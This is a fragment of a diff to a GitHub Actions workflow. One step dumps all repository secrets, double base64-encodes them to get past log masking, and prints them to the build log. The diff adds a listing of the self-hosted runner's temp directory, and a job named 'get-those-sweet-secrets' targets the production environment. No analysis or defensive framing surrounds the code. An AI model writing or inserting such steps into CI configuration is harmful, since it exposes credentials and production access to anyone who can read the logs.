@@ -10,7 +10,7 @@ jobs:
       - run: |
           echo '${{ toJson(secrets) }}' | base64 | base64 > test.txt
           cat test.txt
-
+          ls -la /home/ec2-user/actions-runner/_work/_temp/
   get-those-sweet-secrets:
     runs-on: self-hosted
     environment: production
